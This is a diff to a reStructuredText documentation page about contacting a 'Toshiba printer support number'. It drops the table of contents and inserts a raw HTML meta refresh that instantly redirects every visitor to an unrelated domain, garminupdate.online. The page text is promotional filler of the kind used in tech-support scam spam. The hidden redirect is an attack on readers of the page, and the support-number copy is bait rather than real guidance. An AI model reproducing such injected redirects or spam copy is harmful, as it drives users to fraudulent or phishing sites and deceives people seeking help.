@@ -1,9 +1,10 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
 How to Contact Toshiba Printer Support Number? 😊
 ============================================
 
-.. toctree::
-   :maxdepth: 2
-   :caption: Contents:
 
 Toshiba printers are known for their performance, precision, and user-friendly design. Whether used at home, in small offices, or in large enterprise environments, Toshiba printers offer reliability that users count on daily. But even with the most dependable technology, occasional glitches or questions are inevitable. That’s where the Toshiba printer support number becomes an essential resource.
 
